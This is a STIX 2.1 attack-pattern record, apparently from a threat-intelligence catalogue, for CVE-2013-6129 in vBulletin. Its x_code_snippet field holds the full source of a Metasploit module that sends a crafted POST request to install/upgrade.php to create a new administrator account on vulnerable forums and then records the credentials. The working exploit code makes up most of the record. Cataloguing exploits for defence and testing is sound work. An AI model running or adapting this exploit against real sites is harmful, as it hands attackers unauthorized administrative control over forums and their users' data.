{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26dcf38c-292f-44b0-9e36-fa54e5a494ee",
    "created": "2024-08-14T16:23:17.269231Z",
    "modified": "2024-08-14T16:23:17.269235Z",
    "name": "vBulletin Administrator Account Creation",
    "description": " This module abuses the \"install/upgrade.php\" component on vBulletin 4.1+ and 4.5+ to create a new administrator account, as exploited in the wild on October 2013. This module has been tested successfully on vBulletin 4.1.5 and 4.1.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/vbulletin_upgrade_admin.rb",
            "external_id": "vbulletin_upgrade_admin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6129"
        },
        {
            "source_name": "reference",
            "url": "http://blog.imperva.com/2013/10/threat-advisory-a-vbulletin-exploit-administrator-injection.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/3991423-potential-vbulletin-exploit-vbulletin-4-1-vbulletin-5"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'vBulletin Administrator Account Creation',\n        'Description' => %q{\n          This module abuses the \"install/upgrade.php\" component on vBulletin 4.1+ and 4.5+ to\n          create a new administrator account, as exploited in the wild on October 2013. This module\n          has been tested successfully on vBulletin 4.1.5 and 4.1.0.\n        },\n        'Author' => [\n          'Unknown', # Vulnerability discoverer? found in the wild\n          'juan vazquez' # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2013-6129' ],\n          [ 'URL', 'http://blog.imperva.com/2013/10/threat-advisory-a-vbulletin-exploit-administrator-injection.html'],\n          [ 'OSVDB', '98370' ],\n          [ 'URL', 'http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/3991423-potential-vbulletin-exploit-vbulletin-4-1-vbulletin-5']\n        ],\n        'DisclosureDate' => '2013-10-09'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The vbulletin URI', '/']),\n        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),\n        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),\n        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])\n      ]\n    )\n  end\n\n  def user\n    datastore['USERNAME']\n  end\n\n  def pass\n    datastore['PASSWORD']\n  end\n\n  def run\n    if user == pass\n      print_error('Please select a password different than the username')\n      return\n    end\n\n    print_status('Trying a new admin vBulletin account...')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'install', 'upgrade.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        'version' => 'install',\n        'response' => 'true',\n        'checktable' => 'false',\n        'firstrun' => 'false',\n        'step' => '7',\n        'startat' => '0',\n        'only' => 'false',\n        'options[skiptemplatemerge]' => '0',\n        'reponse' => 'yes',\n        'htmlsubmit' => '1',\n        'htmldata[username]' => user,\n        'htmldata[password]' => pass,\n        'htmldata[confirmpassword]' => pass,\n        'htmldata[email]' => datastore['EMAIL']\n      },\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest'\n      }\n    })\n\n    if res && (res.code == 200) && res.body =~ (/Administrator account created/)\n      print_good(\"Admin account with credentials #{user}:#{pass} successfully created\")\n      connection_details = {\n        module_fullname: fullname,\n        username: user,\n        private_data: pass,\n        private_type: :password,\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        proof: res.body\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n    else\n      print_error('Admin account creation failed')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-09"
}